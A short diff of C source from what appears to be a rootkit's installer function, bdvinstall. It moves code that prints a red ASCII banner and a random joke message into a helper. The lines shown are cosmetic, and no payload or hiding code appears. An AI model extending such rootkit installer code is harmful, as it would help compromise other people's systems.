@@ -1,15 +1,5 @@
 void bdvinstall(char *const argv[]){
-#ifndef NO_ROOTKIT_ANSI
-    printf("\033[0;31m");
-    for(int i = 0; i != BDANSI_SIZE; i++)
-        printf("%c", bdansi[i]);
-    printf("\033[0m\n");
-#endif
-    size_t rolfsize = sizeofarr(rolfs);
-    srand(time(NULL));
-    char *randrolf = rolfs[rand() % rolfsize];
-    printf("\e[1;31m%s\e[0m\n", randrolf);
-
+    dorolf();
     printf("Name: \e[1;31m%s\e[0m\n", BD_UNAME);
     printf("Creating installation directory.\n");
 
